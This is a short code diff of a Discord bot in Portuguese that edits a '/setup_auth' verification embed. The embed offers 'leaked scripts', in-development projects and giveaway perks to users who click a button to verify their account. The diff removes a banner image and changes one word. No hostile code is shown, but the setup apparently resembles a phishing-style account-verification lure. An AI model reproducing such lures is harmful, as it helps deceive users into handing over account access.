@@ -177,7 +177,7 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
     
-    // --- 1. COMANDO SETUP (TEXTO ATUALIZADO) ---
+    // --- 1. COMANDO SETUP (SEM IMAGEM) ---
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
 
@@ -185,9 +185,9 @@ client.on('interactionCreate', async interaction => {
 
         const embed = new EmbedBuilder()
             .setTitle('🔓 Liberação de Acesso')
-            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para autenticar sua conta.')
+            .setDescription('Verifique-se para liberar **scripts vazados**, **projetos em desenvolvimento**, e muitas outras coisas, como **privilégio em sorteios**!\n\nClique no botão abaixo para vereficar sua conta.')
             .setColor(0x5865F2)
-            .setImage('https://i.imgur.com/2K1Y8xX.png') // Você pode trocar por um banner seu se quiser
+            // A linha .setImage(...) foi removida daqui
             .setFooter({ text: 'Sistema Seguro de Verificação' });
 
         const row = new ActionRowBuilder().addComponents(
